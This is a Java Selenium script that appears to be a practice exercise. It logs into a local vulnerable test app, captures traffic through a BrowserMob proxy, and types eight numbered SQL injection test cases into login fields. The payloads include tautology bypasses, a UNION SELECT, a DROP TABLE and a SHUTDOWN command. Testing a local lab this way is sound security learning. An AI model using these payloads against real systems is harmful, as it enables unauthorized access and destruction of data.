import io.github.bonigarcia.wdm.WebDriverManager;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.handler.codec.http.HttpResponse;
import net.lightbody.bmp.BrowserMobProxy;
import net.lightbody.bmp.BrowserMobProxyServer;
import net.lightbody.bmp.client.ClientUtil;
import net.lightbody.bmp.core.har.Har;
import net.lightbody.bmp.filters.RequestFilter;
import net.lightbody.bmp.util.HttpMessageContents;
import net.lightbody.bmp.util.HttpMessageInfo;
import org.openqa.selenium.By;
import org.openqa.selenium.Proxy;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.remote.CapabilityType;
import org.openqa.selenium.remote.DesiredCapabilities;

public class Main {


    // psvm
    public static void main(String[] args) throws InterruptedException {

        WebDriver driver = FactoryDriver.getChromeDriver();
        driver.get("http://localhost:9000/");

        driver.findElement(By.name("username")).sendKeys("admin");
        driver.findElement(By.name("password")).sendKeys("password");
        driver.findElement(By.name("Login")).click();

        Thread.sleep(2000);

        MyWebElement myWebElement = new MyWebElement(driver);
        driver.get("http://localhost:9000/vulnerabilities/sqli/");

        // driver.findElement(By.name("Sql")).click();

        //  myWebElement.findWithXPath("Sql Injection").click();

      /*  BrowserMobProxy proxy = new BrowserMobProxyServer();
        proxy.addRequestFilter(new RequestFilter() {
            @Override
            public HttpResponse filterRequest(HttpRequest httpRequest, HttpMessageContents httpMessageContents, HttpMessageInfo httpMessageInfo) {


                // retrieve the existing message contents as a String or, for binary contents, as a byte[]
                String messageContents = httpMessageContents.getTextContents();
                System.out.println(messageContents);


                // do some manipulation of the contents
                String newContents = messageContents.replaceAll("original-string", "my-modified-string");
                //[...]

                // replace the existing content by calling setTextContents() or setBinaryContents()
                httpMessageContents.setTextContents(newContents);


                // in the request filter, you can return an HttpResponse object to "short-circuit" the request
                return null;
            }
        });
        proxy.start(0);*/






        BrowserMobProxy proxy = new BrowserMobProxyServer();
        proxy.start(); // can specify a port here if you like

        // get the selenium proxy object
        Proxy seleniumProxy = ClientUtil.createSeleniumProxy(proxy);

        DesiredCapabilities capabilities = new DesiredCapabilities();
        capabilities.setCapability(CapabilityType.PROXY, seleniumProxy);

        // if chromedriver isn't on your system path, you'll need to set this system property
       // System.setProperty("webdriver.chrome.driver", "/path/to/chromedriver");
        WebDriver driver1 = new ChromeDriver(capabilities);
        driver1.get("http://localhost:9000/");




        proxy.newHar("ilmiohar");
        System.err.println("ooooo");

        // open yahoo.com

        // get the HAR data
        Har har = proxy.getHar();


        System.out.println(proxy.getHar().getLog().toString());

        System.out.println("kjaj");
        try {
            Thread.sleep(2000);
            driver.findElement(By.name("id")).sendKeys("1");
            driver.findElement(By.name("Submit")).click();
            Thread.sleep(2000);
            Thread.sleep(2000);

            //TC01
            driver.findElement(By.name("username")).sendKeys("abcd");
            driver.findElement(By.name("password")).sendKeys("anything' or 'x'='x");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

            //TC02
            driver.findElement(By.name("username")).sendKeys("abcd");
            driver.findElement(By.name("password")).sendKeys("'; drop table xyz");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

            //TC03
            driver.findElement(By.name("username")).sendKeys("' UNION SELECT * FROM emp_details --");
            driver.findElement(By.name("password")).sendKeys("abcd");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

            //TC04
            driver.findElement(By.name("username")).sendKeys("';SHUTDOWN; -- ");
            driver.findElement(By.name("password")).sendKeys("abcd");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

            //TC05
            driver.findElement(By.name("username")).sendKeys("'or'1'='1");
            driver.findElement(By.name("password")).sendKeys("'or'1'='1");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

            //TC06
            driver.findElement(By.name("username")).sendKeys("'or'a'='a");
            driver.findElement(By.name("password")).sendKeys("'or'a'='a");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

            //TC07
            driver.findElement(By.name("username")).sendKeys("'or'1'='1 and firstname <> 'Thanos");
            driver.findElement(By.name("password")).sendKeys("'or'1'='1 and firstname <> 'Thanos");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

            //TC08
            driver.findElement(By.name("username")).sendKeys("'or'1'='1 and firstname <> 'Thanos and firstname <> 'Nikos");
            driver.findElement(By.name("password")).sendKeys("'or'1'='1 and firstname <> 'Thanos and firstname <> 'Nikos");
            Thread.sleep(2000);
            driver.findElement(By.name("username")).clear();
            driver.findElement(By.name("password")).clear();

        } catch (Exception e) {

            System.out.println(e.getMessage());

        }        //driver.findElement(By.name("Submit")).click();
        //Thread.sleep(2000);
        driver.close();
        driver.quit();


    }
}

